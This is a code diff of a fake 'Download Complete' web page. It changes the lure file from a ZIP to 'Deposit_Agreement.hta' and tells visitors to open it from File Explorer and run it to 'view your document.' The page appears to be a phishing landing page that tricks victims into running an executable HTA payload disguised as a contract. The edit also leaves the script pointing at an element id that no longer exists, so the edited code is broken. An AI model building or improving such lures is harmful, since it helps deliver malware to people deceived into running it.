@@ -25,7 +25,7 @@
         
         <h1>Download Complete</h1>
         <p>You've received a secured document.</p>
-        <p>Your Document has been saved to your device. Find <span id="zipName" class="filename">Contract_Agreement.zip</span> in Recent (File Explorer), open it, and run the file inside to view your document.</p>
+        <p>Your Document has been saved to your device. Find <span id="htaName" class="filename">Deposit_Agreement.hta</span> in Recent (File Explorer), open it, and run the file inside to view your document.</p>
         
         <a href="#" class="btn" onclick="window.location.reload()">Download Document Again</a>
     </div>
@@ -33,7 +33,7 @@
     <script>
         // Get the unique filename from the URL
         const urlParams = new URLSearchParams(window.location.search);
-        const uniqueZip = urlParams.get('zip') || 'Contract_Agreement.zip';
+        const uniqueZip = urlParams.get('hta') || 'Deposit_Agreement.hta';
         document.getElementById('zipName').innerText = uniqueZip;
     </script>
 </body>
